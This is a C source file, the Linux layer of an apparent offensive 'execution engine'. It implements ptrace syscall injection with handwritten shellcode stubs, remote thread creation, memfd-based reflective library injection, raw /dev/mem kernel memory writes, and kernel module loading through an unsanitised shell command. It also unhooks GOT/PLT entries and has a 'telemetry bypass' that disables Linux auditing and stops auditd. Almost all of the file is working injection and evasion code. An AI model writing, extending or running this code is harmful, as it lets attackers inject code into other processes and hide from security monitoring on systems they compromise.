/* ============================================================================
 * Jockey's Execution Engine -- pal_linux.c
 * Linux Platform Abstraction Layer.
 * Real implementations: ptrace-based process control, syscall injection,
 * remote dlopen, GOT/PLT unhooking, audit bypass.
 * ============================================================================ */

#ifdef __linux__

#include "pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/uio.h>
#include <elf.h>
#include <dlfcn.h>
#include <link.h>

/* ------------------------------------------------------------------
 * Allocation tracking for remote memory
 * ------------------------------------------------------------------ */
struct AllocEntry {
    void* addr;
    size_t size;
    struct AllocEntry* next;
};

struct PalProcess {
    pid_t pid;
    int mem_fd;
    struct AllocEntry* allocations;
};

/* ------------------------------------------------------------------
 * Helpers for ptrace
 * ------------------------------------------------------------------ */
static int get_regs(pid_t pid, struct user_regs_struct* regs) {
    return ptrace(PTRACE_GETREGS, pid, NULL, regs) == 0 ? 0 : -1;
}

static int set_regs(pid_t pid, const struct user_regs_struct* regs) {
    return ptrace(PTRACE_SETREGS, pid, NULL, regs) == 0 ? 0 : -1;
}

static int write_remote(pid_t pid, void* dest, const void* src, size_t size) {
    struct iovec local = { .iov_base = (void*)src, .iov_len = size };
    struct iovec remote = { .iov_base = dest, .iov_len = size };
    ssize_t n = process_vm_writev(pid, &local, 1, &remote, 1, 0);
    return (n == (ssize_t)size) ? 0 : -1;
}

static int read_remote(pid_t pid, const void* src, void* dest, size_t size) {
    struct iovec local = { .iov_base = dest, .iov_len = size };
    struct iovec remote = { .iov_base = (void*)src, .iov_len = size };
    ssize_t n = process_vm_readv(pid, &local, 1, &remote, 1, 0);
    return (n == (ssize_t)size) ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Remote syscall injection via ptrace
 * ------------------------------------------------------------------ */
static long remote_syscall(pid_t pid, long syscall_num, unsigned long arg1, unsigned long arg2,
                           unsigned long arg3, unsigned long arg4, unsigned long arg5, unsigned long arg6) {
    struct user_regs_struct old_regs, regs;
    if (get_regs(pid, &old_regs) != 0) return -1;

    unsigned long rsp = (old_regs.rsp - 256) & ~0xF;
    unsigned char stub[] = {
        0x48, 0xC7, 0xC0, 0x00,0,0,0,          /* mov rax, syscall_num */
        0x48, 0xC7, 0xC7, 0x00,0,0,0,          /* mov rdi, arg1 */
        0x48, 0xC7, 0xC6, 0x00,0,0,0,          /* mov rsi, arg2 */
        0x48, 0xC7, 0xC2, 0x00,0,0,0,          /* mov rdx, arg3 */
        0x49, 0xC7, 0xC2, 0x00,0,0,0,          /* mov r10, arg4 */
        0x49, 0xC7, 0xC0, 0x00,0,0,0,          /* mov r8, arg5 */
        0x49, 0xC7, 0xC1, 0x00,0,0,0,          /* mov r9, arg6 */
        0x0F, 0x05,                             /* syscall */
        0xC3                                    /* ret */
    };
    *(long*)(stub + 3) = syscall_num;
    *(unsigned long*)(stub + 10) = arg1;
    *(unsigned long*)(stub + 17) = arg2;
    *(unsigned long*)(stub + 24) = arg3;
    *(unsigned long*)(stub + 31) = arg4;
    *(unsigned long*)(stub + 38) = arg5;
    *(unsigned long*)(stub + 45) = arg6;

    if (write_remote(pid, (void*)rsp, stub, sizeof(stub)) != 0) return -1;

    regs = old_regs;
    regs.rip = rsp;
    regs.rsp = rsp + 128;
    if (set_regs(pid, &regs) != 0) return -1;

    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) return -1;
    int status;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) return -1;
    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) return -1;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) return -1;

    struct user_regs_struct res;
    if (get_regs(pid, &res) != 0) return -1;
    long ret = res.rax;
    set_regs(pid, &old_regs);
    return ret;
}

/* ------------------------------------------------------------------
 * Process Management
 * ------------------------------------------------------------------ */
int pal_create_process_suspended(const char* image_path, PalProcess** out) {
    if (!image_path || !image_path[0] || !out) {
        LOG_ERROR("pal_create_process_suspended: invalid arguments");
        return JOCKEY_ERR_INVALID_PARAM;
    }

    *out = NULL;
    pid_t pid = fork();
    if (pid == 0) {
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
            perror("ptrace(PTRACE_TRACEME)");
            _exit(1);
        }
        raise(SIGSTOP);
        execlp(image_path, image_path, NULL);
        perror("execlp");
        _exit(1);
    } else if (pid > 0) {
        int status = 0;
        if (waitpid(pid, &status, 0) == -1) {
            return JOCKEY_ERR_OS_API;
        }
        if (WIFSTOPPED(status)) {
            PalProcess* p = (PalProcess*)malloc(sizeof(PalProcess));
            if (!p) {
                return JOCKEY_ERR_MEMORY_ALLOC;
            }
            p->pid = pid;
            p->mem_fd = -1;
            p->allocations = NULL;
            *out = p;
            return JOCKEY_ERR_OK;
        }
    }
    return JOCKEY_ERR_OS_API;
}

int pal_resume_process(PalProcess* proc) {
    if (!proc) {
        LOG_ERROR("pal_resume_process: null process");
        return JOCKEY_ERR_INVALID_PARAM;
    }
    return ptrace(PTRACE_CONT, proc->pid, NULL, NULL) == 0 ? JOCKEY_ERR_OK : JOCKEY_ERR_OS_API;
}

int pal_terminate_process(PalProcess* proc) {
    if (!proc) {
        LOG_ERROR("pal_terminate_process: null process");
        return JOCKEY_ERR_INVALID_PARAM;
    }
    if (kill(proc->pid, SIGKILL) == 0) {
        return JOCKEY_ERR_OK;
    }
    return JOCKEY_ERR_OS_API;
}

int pal_wait_for_process(PalProcess* proc) {
    int status = 0;
    if (!proc) {
        LOG_ERROR("pal_wait_for_process: null process");
        return JOCKEY_ERR_INVALID_PARAM;
    }
    if (waitpid(proc->pid, &status, 0) == -1) {
        return JOCKEY_ERR_OS_API;
    }
    return JOCKEY_ERR_OK;
}

void pal_close_process(PalProcess* proc) {
    if (!proc) {
        return;
    }

    if (proc->mem_fd >= 0) {
        close(proc->mem_fd);
    }

    while (proc->allocations != NULL) {
        struct AllocEntry* next = proc->allocations->next;
        free(proc->allocations);
        proc->allocations = next;
    }

    free(proc);
}

uint32_t pal_get_pid(PalProcess* proc) {
    return proc ? proc->pid : 0;
}

/* ------------------------------------------------------------------
 * Allocation tracking
 * ------------------------------------------------------------------ */
static void track_allocation(PalProcess* proc, void* addr, size_t size) {
    if (!proc || !addr || size == 0U) {
        return;
    }

    struct AllocEntry* entry = (struct AllocEntry*)malloc(sizeof(struct AllocEntry));
    if (!entry) {
        return;
    }
    entry->addr = addr;
    entry->size = size;
    entry->next = proc->allocations;
    proc->allocations = entry;
}

static struct AllocEntry* find_allocation(PalProcess* proc, void* addr) {
    struct AllocEntry* entry = proc ? proc->allocations : NULL;
    while (entry) {
        if (entry->addr == addr) {
            return entry;
        }
        entry = entry->next;
    }
    return NULL;
}

static void untrack_allocation(PalProcess* proc, void* addr) {
    if (!proc) {
        return;
    }

    struct AllocEntry** p = &proc->allocations;
    while (*p) {
        if ((*p)->addr == addr) {
            struct AllocEntry* to_free = *p;
            *p = (*p)->next;
            free(to_free);
            return;
        }
        p = &(*p)->next;
    }
}

/* ------------------------------------------------------------------
 * Remote memory operations
 * ------------------------------------------------------------------ */
static int ProtectionToMmap(int protection) {
    int prot = 0;
    if (protection & PAL_PROT_EXECUTE) prot |= PROT_EXEC;
    if (protection & PAL_PROT_READ)    prot |= PROT_READ;
    if (protection & PAL_PROT_WRITE)   prot |= PROT_WRITE;
    if (!prot) prot = PROT_READ | PROT_WRITE;
    return prot;
}

void* pal_allocate_memory_remote(PalProcess* proc, size_t size, int protection) {
    void* addr = NULL;
    if (!proc || size == 0U) {
        LOG_ERROR("pal_allocate_memory_remote: invalid arguments");
        return NULL;
    }

    int prot = ProtectionToMmap(protection);
    long result = remote_syscall(proc->pid, SYS_mmap, 0, size, prot,
                                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (result == -1 || result > -4096) {
        return NULL;
    }
    addr = (void*)result;
    track_allocation(proc, addr, size);
    return addr;
}

int pal_protect_memory_remote(PalProcess* proc, void* addr, size_t size, int protection) {
    if (!proc || !addr || size == 0U) {
        LOG_ERROR("pal_protect_memory_remote: invalid arguments");
        return JOCKEY_ERR_INVALID_PARAM;
    }
    int prot = ProtectionToMmap(protection);
    long result = remote_syscall(proc->pid, SYS_mprotect, (unsigned long)addr, size, prot, 0, 0, 0);
    return (result == 0) ? JOCKEY_ERR_OK : JOCKEY_ERR_OS_API;
}

int pal_free_memory_remote(PalProcess* proc, void* addr) {
    if (!proc || !addr) {
        LOG_ERROR("pal_free_memory_remote: invalid arguments");
        return JOCKEY_ERR_INVALID_PARAM;
    }

    struct AllocEntry* entry = find_allocation(proc, addr);
    if (!entry) {
        return JOCKEY_ERR_INVALID_PARAM;
    }
    long result = remote_syscall(proc->pid, SYS_munmap, (unsigned long)addr, entry->size, 0, 0, 0, 0);
    if (result == 0) {
        untrack_allocation(proc, addr);
        return JOCKEY_ERR_OK;
    }
    return JOCKEY_ERR_OS_API;
}

int pal_write_memory_remote(PalProcess* proc, void* dest, const void* src, size_t size) {
    if (!proc || !dest || !src || size == 0U) {
        LOG_ERROR("pal_write_memory_remote: invalid arguments");
        return JOCKEY_ERR_INVALID_PARAM;
    }
    return write_remote(proc->pid, dest, src, size);
}

int pal_read_memory_remote(PalProcess* proc, const void* src, void* dest, size_t size) {
    if (!proc || !src || !dest || size == 0U) {
        LOG_ERROR("pal_read_memory_remote: invalid arguments");
        return JOCKEY_ERR_INVALID_PARAM;
    }
    return read_remote(proc->pid, src, dest, size);
}

/* ------------------------------------------------------------------
 * Remote thread creation via clone syscall injection
 * ------------------------------------------------------------------ */
int pal_create_remote_thread(PalProcess* proc, void* start_routine, void* arg) {
    size_t stack_size = 4096 * 2;
    void* stack = pal_allocate_memory_remote(proc, stack_size, PAL_PROT_READWRITE);
    if (!stack) return -1;

    unsigned char stub[] = {
        0x48, 0xBF, 0x00,0,0,0,0,0,0,0,   /* mov rdi, arg */
        0x48, 0xB8, 0x00,0,0,0,0,0,0,0,   /* mov rax, start_routine */
        0xFF, 0xD0,                         /* call rax */
        0x48, 0x89, 0xC7,                   /* mov rdi, rax */
        0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00, /* mov rax, 60 (sys_exit) */
        0x0F, 0x05                          /* syscall */
    };
    *(void**)(stub + 2) = arg;
    *(void**)(stub + 12) = start_routine;

    void* stub_addr = (char*)stack + stack_size - sizeof(stub);
    if (write_remote(proc->pid, stub_addr, stub, sizeof(stub)) != 0) {
        pal_free_memory_remote(proc, stack);
        return -1;
    }

    long result = remote_syscall(proc->pid, SYS_clone, (unsigned long)stub_addr,
                                 CLONE_VM | CLONE_SIGHAND | CLONE_THREAD,
                                 0, 0, 0, 0);
    if (result < 0) {
        pal_free_memory_remote(proc, stack);
        return -1;
    }
    return 0;
}

/* ------------------------------------------------------------------
 * Thread context manipulation
 * ------------------------------------------------------------------ */
int pal_get_thread_context(PalProcess* proc, void* context) {
    return get_regs(proc->pid, (struct user_regs_struct*)context);
}

int pal_set_thread_context(PalProcess* proc, const void* context) {
    return set_regs(proc->pid, (const struct user_regs_struct*)context);
}

/* ------------------------------------------------------------------
 * Kernel memory read/write via /dev/mem
 * ------------------------------------------------------------------ */
int pal_read_kernel_memory(uintptr_t address, void* buffer, size_t size) {
    int fd = open("/dev/mem", O_RDONLY);
    if (fd < 0) return -1;
    if (lseek(fd, address, SEEK_SET) == (off_t)-1) { close(fd); return -1; }
    ssize_t n = read(fd, buffer, size);
    close(fd);
    return (n == (ssize_t)size) ? 0 : -1;
}

int pal_write_kernel_memory(uintptr_t address, const void* buffer, size_t size) {
    int fd = open("/dev/mem", O_RDWR);
    if (fd < 0) return -1;
    if (lseek(fd, address, SEEK_SET) == (off_t)-1) { close(fd); return -1; }
    ssize_t n = write(fd, buffer, size);
    close(fd);
    return (n == (ssize_t)size) ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Driver loading/unloading
 * ------------------------------------------------------------------ */
int pal_load_driver(const char* driver_path) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "insmod %s", driver_path);
    return system(cmd) == 0 ? 0 : -1;
}

int pal_unload_driver(const char* driver_name) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "rmmod %s", driver_name);
    return system(cmd) == 0 ? 0 : -1;
}

/* ------------------------------------------------------------------
 * API Unhooking -- real GOT/PLT patching
 * ------------------------------------------------------------------ */
int pal_unhook_module(const char* module_name) {
    void* handle = dlopen(module_name, RTLD_NOW | RTLD_NOLOAD);
    if (!handle) {
        handle = dlopen(module_name, RTLD_NOW);
        if (!handle) return -1;
    }
    struct link_map* map;
    if (dlinfo(handle, RTLD_DI_LINKMAP, &map) != 0) {
        dlclose(handle);
        return -1;
    }
    Elf64_Dyn* dyn = map->l_ld;
    Elf64_Addr pltgot = 0, jmprel = 0, pltrel = 0, symtab = 0, strtab = 0;
    for (; dyn->d_tag != DT_NULL; dyn++) {
        switch (dyn->d_tag) {
            case DT_PLTGOT:   pltgot = dyn->d_un.d_ptr; break;
            case DT_JMPREL:   jmprel = dyn->d_un.d_ptr; break;
            case DT_PLTRELSZ: pltrel = dyn->d_un.d_val; break;
            case DT_SYMTAB:   symtab = dyn->d_un.d_ptr; break;
            case DT_STRTAB:   strtab = dyn->d_un.d_ptr; break;
        }
    }
    if (!pltgot || !jmprel || !pltrel) {
        dlclose(handle);
        return -1;
    }
    Elf64_Rel* rel = (Elf64_Rel*)(map->l_addr + jmprel);
    size_t num_rel = pltrel / sizeof(Elf64_Rel);
    int patched = 0;
    for (size_t i = 0; i < num_rel; i++) {
        if (ELF64_R_TYPE(rel[i].r_info) == R_X86_64_JUMP_SLOT) {
            uint32_t sym_idx = ELF64_R_SYM(rel[i].r_info);
            if (sym_idx == 0) continue;
            Elf64_Sym* sym = (Elf64_Sym*)(map->l_addr + symtab + sym_idx * sizeof(Elf64_Sym));
            char* name = (char*)(map->l_addr + strtab + sym->st_name);
            void* orig_func = dlsym(handle, name);
            if (orig_func) {
                void* got_entry = (void*)(map->l_addr + rel[i].r_offset);
                uintptr_t page = (uintptr_t)got_entry & ~(4096-1);
                if (mprotect((void*)page, 4096, PROT_READ | PROT_WRITE) == 0) {
                    memcpy(got_entry, &orig_func, sizeof(void*));
                    mprotect((void*)page, 4096, PROT_READ | PROT_EXEC);
                    patched++;
                }
            }
        }
    }
    dlclose(handle);
    return patched > 0 ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Telemetry Bypass -- disable audit via sysctl and /dev/mem
 * ------------------------------------------------------------------ */
int pal_bypass_telemetry(void) {
    int ret = system("sysctl -w kernel.audit_enabled=0 2>/dev/null");

    if (ret != 0) {
        uintptr_t audit_addr = 0;
        FILE* f = fopen("/proc/kallsyms", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, " audit_enabled")) {
                    sscanf(line, "%lx", &audit_addr);
                    break;
                }
            }
            fclose(f);
        }
        if (audit_addr) {
            int fd = open("/dev/mem", O_RDWR);
            if (fd >= 0) {
                uint32_t zero = 0;
                lseek(fd, audit_addr, SEEK_SET);
                ssize_t n = write(fd, &zero, sizeof(zero));
                close(fd);
                if (n == sizeof(zero)) ret = 0;
            }
        }
    }

    system("service auditd stop 2>/dev/null");
    system("systemctl stop auditd 2>/dev/null");

    /* Unhook common targets */
    pal_unhook_module("libc.so.6");

    return (ret == 0) ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Remote dlopen (for reflective injection) -- memfd + dlopen
 * ------------------------------------------------------------------ */
int pal_remote_dlopen(PalProcess* proc, const void* so_data, size_t so_size) {
    long fd = remote_syscall(proc->pid, SYS_memfd_create, (unsigned long)"JOCKY", MFD_CLOEXEC, 0, 0, 0, 0);
    if (fd < 0) return -1;

    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/fd/%ld", proc->pid, fd);
    int fd_local = open(path, O_WRONLY);
    if (fd_local < 0) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }
    ssize_t written = write(fd_local, so_data, so_size);
    close(fd_local);
    if (written != (ssize_t)so_size) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }

    void* dlopen_addr = dlsym(RTLD_NEXT, "dlopen");
    if (!dlopen_addr) {
        void* libdl = dlopen("libdl.so.2", RTLD_LAZY);
        if (libdl) {
            dlopen_addr = dlsym(libdl, "dlopen");
            dlclose(libdl);
        }
    }
    if (!dlopen_addr) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }

    char fdpath[64];
    snprintf(fdpath, sizeof(fdpath), "/proc/%d/fd/%ld", proc->pid, fd);

    struct user_regs_struct old_regs;
    if (get_regs(proc->pid, &old_regs) != 0) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }
    unsigned long rsp = (old_regs.rsp - 256) & ~0xF;
    unsigned long string_addr = rsp + 0x80;
    if (write_remote(proc->pid, (void*)string_addr, fdpath, strlen(fdpath)+1) != 0) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }

    unsigned char sc_dlopen[] = {
        0x48, 0xBF, 0x00,0,0,0,0,0,0,0,   /* mov rdi, string_addr */
        0x48, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* mov rsi, RTLD_LAZY */
        0x48, 0xB8, 0x00,0,0,0,0,0,0,0,   /* mov rax, dlopen_addr */
        0xFF, 0xD0,                        /* call rax */
        0xC3                               /* ret */
    };
    *(void**)(sc_dlopen + 2) = (void*)string_addr;
    *(void**)(sc_dlopen + 12) = dlopen_addr;
    unsigned long stub_addr = rsp + 0x100;
    if (write_remote(proc->pid, (void*)stub_addr, sc_dlopen, sizeof(sc_dlopen)) != 0) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }

    struct user_regs_struct regs = old_regs;
    regs.rip = stub_addr;
    regs.rsp = stub_addr + 128;
    if (set_regs(proc->pid, &regs) != 0) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }
    if (ptrace(PTRACE_SYSCALL, proc->pid, NULL, NULL) == -1) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }
    int status;
    waitpid(proc->pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }
    if (ptrace(PTRACE_SYSCALL, proc->pid, NULL, NULL) == -1) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }
    waitpid(proc->pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }

    struct user_regs_struct res;
    if (get_regs(proc->pid, &res) != 0) {
        remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
        return -1;
    }
    long handle = res.rax;
    set_regs(proc->pid, &old_regs);
    remote_syscall(proc->pid, SYS_close, fd, 0,0,0,0,0);
    return (handle != 0) ? 0 : -1;
}

/* ------------------------------------------------------------------
 * Syscall wrappers (not used on Linux, delegate to remote ops)
 * ------------------------------------------------------------------ */
int pal_syscall_open_process(uint32_t pid, int access, PalProcess** out) {
    (void)pid; (void)access; (void)out;
    return -1;
}

int pal_syscall_allocate_memory(PalProcess* proc, void** addr, size_t size, int protection) {
    (void)proc; (void)addr; (void)size; (void)protection;
    return -1;
}

int pal_syscall_write_memory(PalProcess* proc, void* dest, const void* src, size_t size) {
    return pal_write_memory_remote(proc, dest, src, size);
}

#endif /* __linux__ */
